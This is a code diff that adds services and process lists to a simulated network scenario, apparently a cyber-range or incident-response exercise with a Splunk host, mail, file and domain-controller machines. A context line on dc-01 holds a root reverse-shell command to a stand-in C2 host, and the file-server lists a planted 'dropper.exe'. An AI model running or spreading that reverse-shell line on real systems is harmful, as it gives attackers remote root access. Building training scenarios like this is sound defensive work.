@@ -144,6 +144,19 @@ export const DEMO_03: WorldSpec = {
                     mode: 0o644,
                 },
             },
+
+            services: [
+                { name: 'sshd', command: '/usr/sbin/sshd -D', ports: [22], autostart: true },
+                { name: 'splunkd', command: '/opt/splunk/bin/splunkd start --nodaemon', ports: [8000, 8089], autostart: true },
+            ],
+
+            processes: [
+                { name: 'systemd', pid: 1, user: 'root', cpu: 0.1, mem: 3.2 },
+                { name: 'systemd-journald', pid: 241, user: 'root', cpu: 0.0, mem: 1.1 },
+                { name: 'sshd', pid: 611, user: 'root', cpu: 0.0, mem: 1.4 },
+                { name: 'cron', pid: 734, user: 'root', cpu: 0.0, mem: 0.6 },
+                { name: 'splunkd', pid: 1320, user: 'splunk', cpu: 0.7, mem: 86.4 },
+            ],
         },
         'mail-server': {
             hostname: 'mail-server',
@@ -167,6 +180,21 @@ export const DEMO_03: WorldSpec = {
                     mode: 0o755,
                 }
             },
+
+            services: [
+                { name: 'sshd', command: '/usr/sbin/sshd -D', ports: [22], autostart: true },
+                { name: 'smtp', command: '/usr/lib/postfix/sbin/master -d', ports: [25, 587], autostart: true },
+                { name: 'imap', command: '/usr/sbin/dovecot -F', ports: [143, 993], autostart: true },
+            ],
+
+            processes: [
+                { name: 'systemd', pid: 1, user: 'root', cpu: 0.1, mem: 2.8 },
+                { name: 'sshd', pid: 418, user: 'root', cpu: 0.0, mem: 1.3 },
+                { name: 'postfix/master', pid: 911, user: 'root', cpu: 0.1, mem: 2.0 },
+                { name: 'postfix/qmgr', pid: 930, user: 'postfix', cpu: 0.0, mem: 1.1 },
+                { name: 'dovecot', pid: 1044, user: 'root', cpu: 0.1, mem: 3.7 },
+                { name: 'cron', pid: 1183, user: 'root', cpu: 0.0, mem: 0.6 },
+            ],
         },
         'file-server': {
             hostname: 'file-server',
@@ -205,6 +233,20 @@ export const DEMO_03: WorldSpec = {
                     mode: 0o600,
                 }
             },
+
+            services: [
+                { name: 'smb', command: 'Start-Service LanmanServer', ports: [445], autostart: true },
+                { name: 'rdp', command: 'Enable-NetFirewallRule -DisplayGroup "Remote Desktop"', ports: [3389], autostart: true },
+                { name: 'winrm', command: 'winrm quickconfig -quiet', ports: [5985], autostart: true },
+            ],
+
+            processes: [
+                { name: 'System', pid: 4, user: 'SYSTEM', cpu: 0.3, mem: 0.8 },
+                { name: 'lsass.exe', pid: 624, user: 'SYSTEM', cpu: 0.2, mem: 38.0 },
+                { name: 'svchost.exe -k netsvcs', pid: 1012, user: 'SYSTEM', cpu: 0.1, mem: 24.0 },
+                { name: 'spoolsv.exe', pid: 1360, user: 'SYSTEM', cpu: 0.0, mem: 12.0 },
+                { name: 'dropper.exe', pid: 2204, user: 'Administrator', cpu: 5.4, mem: 18.5 },
+            ],
         },
         'dc-01': {
             hostname: 'dc-01',
@@ -235,6 +277,24 @@ export const DEMO_03: WorldSpec = {
                     command: '/bin/bash -c "bash -i >& /dev/tcp/c2.malicious-domain.com/443 0>&1"',
                     user: 'root',
                 },
+            ],
+
+            services: [
+                { name: 'dns', command: '/usr/sbin/named -f', ports: [53], autostart: true },
+                { name: 'kerberos', command: '/usr/sbin/krb5kdc -n', ports: [88], autostart: true },
+                { name: 'ldap', command: '/usr/sbin/slapd -d 0', ports: [389, 636], autostart: true },
+                { name: 'smb', command: '/usr/sbin/smbd -F', ports: [445], autostart: true },
+                { name: 'sshd', command: '/usr/sbin/sshd -D', ports: [22], autostart: true },
+            ],
+
+            processes: [
+                { name: 'systemd', pid: 1, user: 'root', cpu: 0.1, mem: 3.0 },
+                { name: 'krb5kdc', pid: 412, user: 'root', cpu: 0.2, mem: 5.2 },
+                { name: 'named', pid: 580, user: 'named', cpu: 0.1, mem: 4.0 },
+                { name: 'slapd', pid: 731, user: 'openldap', cpu: 0.2, mem: 9.5 },
+                { name: 'smbd', pid: 803, user: 'root', cpu: 0.1, mem: 7.8 },
+                { name: 'sshd', pid: 896, user: 'root', cpu: 0.0, mem: 1.4 },
+                { name: 'cron', pid: 955, user: 'root', cpu: 0.0, mem: 0.6 },
             ],
         },
     },
